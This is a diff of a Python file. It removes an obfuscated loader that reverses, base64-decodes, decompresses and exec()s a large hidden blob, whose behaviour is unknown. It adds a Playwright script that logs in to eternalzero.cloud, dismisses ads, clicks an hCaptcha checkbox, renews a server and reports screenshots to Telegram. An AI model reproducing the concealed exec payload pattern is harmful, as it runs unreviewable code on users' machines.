@@ -1,2 +1,99 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+import os
+import time
+import requests
+from playwright.sync_api import sync_playwright
+from browser import BrowserManager  # 使用你要求的 BrowserManager
+
+# 获取环境配置
+EMAIL = os.environ.get("EMAIL")
+PASSWORD = os.environ.get("PASSWORD")
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+
+def send_telegram(message, photo_path=None):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
+    try:
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={'chat_id': TELEGRAM_CHAT_ID, 'text': message})
+        if photo_path and os.path.exists(photo_path):
+            with open(photo_path, 'rb') as f:
+                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto", data={'chat_id': TELEGRAM_CHAT_ID}, files={'photo': f})
+    except Exception as e:
+        print(f"Telegram 发送失败: {e}")
+
+def run_automation():
+    page = None
+    with sync_playwright() as p:
+        with BrowserManager(p) as context:
+            page = context.new_page()
+            page.set_viewport_size({"width": 1920, "height": 1080})
+            
+            try:
+                # 1. 登录逻辑 (我们的业务)
+                print("访问登录页...")
+                page.goto("https://eternalzero.cloud/login")
+                page.fill("input#email", EMAIL)
+                page.fill("input#password", PASSWORD)
+                page.get_by_role("button", name="Sign in").click()
+                page.wait_for_load_state("networkidle")
+                time.sleep(5)
+
+                # 2. 访问 Info 页面 (我们的业务)
+                print("访问 Info 页面...")
+                page.goto("https://eternalzero.cloud/servers/5541/info")
+                time.sleep(5)
+
+                # 3. 清理广告 (我们的业务)
+                page.evaluate("""() => {
+                    const selectors = ['button.fc-cta-consent', 'button.fc-rewarded-ad-button', '#dismiss-button-element', 'ins.adsbygoogle', 'iframe[src*="ads"]', '.modal-backdrop'];
+                    selectors.forEach(sel => {
+                        document.querySelectorAll(sel).forEach(el => { if(el.offsetParent !== null) el.click(); });
+                    });
+                }""")
+                
+                print("点击 Renew server...")
+                page.wait_for_selector("#renew-button", state="visible", timeout=30000)
+                page.locator("#renew-button").click(force=True)
+                
+                # 4. 验证码监控逻辑 (100% COPY 逻辑)
+                time.sleep(3)
+                # 针对 hCaptcha 调整选择器，通常容器包含 h-captcha
+                if page.locator("iframe[src*='hcaptcha']").count() > 0:
+                    print("检测到验证码，准备激活...")
+                    try:
+                        # 尝试点击验证框
+                        page.locator("iframe[src*='hcaptcha']").content_frame.locator("#checkbox").click()
+                    except: pass
+                    
+                    print("开始实时监控验证过程...")
+                    for i in range(18): # 总共 180 秒监控
+                        time.sleep(10)
+                        screenshot_name = f"monitor_{i}.png"
+                        page.screenshot(path=screenshot_name, full_page=True)
+                        send_telegram(f"验证码处理中... ({ (i+1)*10 }秒)", screenshot_name)
+                        
+                        # 检查验证码是否消失 (hcaptcha 通常在解决后会更新或消失)
+                        if page.locator("iframe[src*='hcaptcha']").count() == 0:
+                            print("✅ 验证码已通过！")
+                            break
+                
+                print("执行最终确认...")
+                try:
+                    page.locator("#renew-button").click(force=True)
+                except Exception as e:
+                    print(f"最终确认失败: {e}")
+
+                time.sleep(5)
+                page.screenshot(path="final.png", full_page=True)
+                send_telegram("流程结束，查看截图确认结果。", "final.png")
+                    
+            except Exception as e:
+                error_msg = f"任务执行出错: {str(e)}"
+                print(error_msg)
+                if page:
+                    page.screenshot(path="error.png", full_page=True)
+                    send_telegram(error_msg, "error.png")
+                else:
+                    send_telegram(error_msg)
+
+if __name__ == "__main__":
+    run_automation()
